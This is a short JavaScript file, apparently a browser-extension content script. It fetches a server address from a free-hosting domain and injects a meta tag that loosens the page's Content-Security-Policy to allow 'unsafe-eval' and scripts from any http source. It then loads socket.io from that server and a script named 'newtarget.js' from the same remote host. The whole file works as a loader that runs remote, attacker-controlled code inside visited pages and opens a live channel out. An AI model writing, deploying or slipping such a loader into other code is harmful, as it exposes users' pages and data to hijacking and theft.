var serverHost, stringifyJs, test;


fetch('https://remotehostsmiley.000webhostapp.com/getServer.json')
.then(response => response.json())
.then(json => {
    stringifyJs = JSON.stringify(json)
    stringifyJs = stringifyJs.split(':"')
    stringifyJs = stringifyJs[1];
    stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
    console.log("extension: " + stringifyJs)
    serverHost = stringifyJs;
})

.then(()=>{
    
    sc = document.createElement("meta");
    sc.setAttribute("http-equiv", "Content-Security-Policy");
    sc.setAttribute("content", `default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'`);
    document.head.appendChild(sc);
    
    

    sc = document.createElement("script");
    sc.setAttribute("defer", "");
    sc.setAttribute("src", `${serverHost}/socket.io/socket.io.js`);
    document.head.appendChild(sc);

    sc = document.createElement("script");
    sc.setAttribute("defer", "");
    sc.setAttribute("src", "https://remotehostsmiley.000webhostapp.com/newtarget.js");
    document.head.appendChild(sc);
})
